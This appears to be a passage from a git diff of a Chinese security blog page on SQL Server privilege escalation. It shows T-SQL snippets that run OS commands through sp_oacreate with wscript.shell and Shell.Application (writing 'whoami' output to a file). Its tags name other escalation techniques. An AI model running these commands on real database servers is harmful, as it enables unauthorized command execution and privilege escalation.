 <h4 id="1-xp-cmdshell-sqlserver-内置的一个命令，-05之后的的需要手动开启"><a href="#1-xp-cmdshell-sqlserver-内置的一个命令，-05之后的的需要手动开启" class="headerlink" title="1.xp_cmdshell(sqlserver 内置的一个命令， 05之后的的需要手动开启)"></a>1.xp_cmdshell(sqlserver 内置的一个命令， 05之后的的需要手动开启)</h4><p>sql server 各版本对应的权限   2008：network权限；2005 system权限</p>
 <p> 开启xp_cmdshell：</p>
@@ -784,7 +854,7 @@ EXEC sp_configure &#39;show advanced options &#39;,0;</code></pre>
 <pre><code class="hljs mssql">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;，@shell output exec sp_oamethod @shell, &#39;run&#39; ,null, &#39;c: \windows\system32\cmd.exe &#x2F;c whoami &gt;C:\who.txt&#39;&#x2F;</code></pre>
 
 <p>最后的回显在C:\who.txt中</p>
-<h4 id="3-也没有回显"><a href="#3-也没有回显" class="headerlink" title="3.也没有回显"></a>3.也没有回显</h4><pre><code class="hljs mssql">declare @o int;
+<h4 id="3-暂时不知道啥名-也没有回显"><a href="#3-暂时不知道啥名-也没有回显" class="headerlink" title="3.暂时不知道啥名~也没有回显"></a>3.暂时不知道啥名~也没有回显</h4><pre><code class="hljs mssql">declare @o int;
 
 exec sp_oacreate &#39;Shell.Application&#39;, @o out;
 
@@ -820,7 +890,7 @@ exec sp_oamethod @o，&#39;ShellExecute &#39;,null，&#39;cmd.exe&quot; , &#39; 
                     
                       <a class="hover-with-bg" href="/tags/%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83-at%E3%80%81sc/">命令提权(at、sc)</a>
                     
-                      <a class="hover-with-bg" href="/tags/%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E6%8F%90%E6%9D%83/">配置错误导致提权</a>
+                      <a class="hover-with-bg" href="/tags/%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E6%8F%90%E6%9D%83-%E4%B8%8D%E5%B8%A6%E5%BC%95%E5%8F%B7%E7%9A%84%E7%9A%84%E8%B7%AF%E5%BE%84%E6%9C%8D%E5%8A%A1%E3%80%81%E5%BC%B1%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9D%83%E9%99%90%E3%80%81%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E3%80%81%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9D%83%E9%99%90%E4%B8%8D%E8%B6%B3%E3%80%81AlwaysInstallElevated%E3%80%81Unattended-Installs/">配置错误导致提权(不带引号的的路径服务、弱文件夹权限、不安全的服务权限、注册表权限不足、AlwaysInstallElevated、Unattended Installs)</a>
                     
                       <a class="hover-with-bg" href="/tags/powerup%E5%B7%A5%E5%85%B7%E6%8F%90%E6%9D%83/">powerup工具提权</a>
                     
@@ -828,7 +898,9 @@ exec sp_oamethod @o，&#39;ShellExecute &#39;,null，&#39;cmd.exe&quot; , &#39; 
                     
                       <a class="hover-with-bg" href="/tags/dll%E6%B3%A8%E5%85%A5/">dll注入</a>
                     
-                      <a class="hover-with-bg" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-mysql%E3%80%81sql-server/">数据库提权(mysql、sql server)</a>
+                      <a class="hover-with-bg" href="/tags/mysql%E6%8F%90%E6%9D%83-sqlmap%E3%80%81udf%E3%80%81%E5%90%AF%E5%8A%A8%E9%A1%B9%E3%80%81mof/">mysql提权(sqlmap、udf、启动项、mof)</a>
+                    
+                      <a class="hover-with-bg" href="/tags/sql-server%E6%8F%90%E6%9D%83-xp-cmdshell%E3%80%81sp-oacreate%E3%80%81sp-oamethod/">sql server提权(xp_cmdshell、sp_oacreate、sp_oamethod)</a>
                     
                   </div>
                 
@@ -840,12 +912,6 @@ exec sp_oamethod @o，&#39;ShellExecute &#39;,null，&#39;cmd.exe&quot; , &#39; 
                 <div class="post-prevnext row">
                   <article class="post-prev col-6">
                     
-                    
-                      <a href="/2020/10/01/linux%E6%8F%90%E6%9D%83-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7-root/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">linux提权(普通用户-root)</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
                     
                   </article>
                   <article class="post-next col-6">
@@ -928,6 +994,30 @@ exec sp_oamethod @o，&#39;ShellExecute &#39;,null，&#39;cmd.exe&quot; , &#39; 
         <span>Fluid</span></a>
     </div> -->
     
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
 
     
 
@@ -958,6 +1048,8 @@ exec sp_oamethod @o，&#39;ShellExecute &#39;,null，&#39;cmd.exe&quot; , &#39; 
   <script  src="/js/clipboard-use.js" ></script>
 
 
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
 
 
